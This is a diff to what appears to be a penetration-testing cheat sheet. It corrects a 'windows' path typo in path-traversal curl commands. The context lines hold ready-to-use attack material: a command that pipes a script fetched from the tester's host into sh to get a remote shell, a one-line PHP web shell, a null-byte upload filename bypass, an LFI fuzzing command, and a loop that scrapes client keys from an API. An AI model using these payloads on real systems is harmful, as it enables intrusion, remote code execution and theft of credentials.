@@ -389,7 +389,7 @@ curl http://$TARGET -H "Cookie: XDEBUG_SESSION="
 python_cmd >> system("curl $MYIP:8888/resh|sh")
 
 [*] Curl
-curl -X GET --path-as-is 'http://$TARGET/../../../../../../../../../../../../window/system32/drivers/etc/hosts'
+curl -X GET --path-as-is 'http://$TARGET/../../../../../../../../../../../../windows/system32/drivers/etc/hosts'
 cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerUrl, .url] | @csv'
 cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H "Api-Version: 3.0" -s | jq -r "[.id, .clientName, .clientKey] | @csv"'
 
@@ -407,7 +407,7 @@ shell%2Ephar%00.png
 <?php passthru($_REQUEST['cmd']); ?>
 
 [*] Path Traversal
-curl -X GET --path-as-is 'http://$TARGET/../../../../../../../../../../../../window/system32/drivers/etc/hosts'
+curl -X GET --path-as-is 'http://$TARGET/../../../../../../../../../../../../windows/system32/drivers/etc/hosts'
 ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 30 -rate 300 -v -mc 200 \
 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 
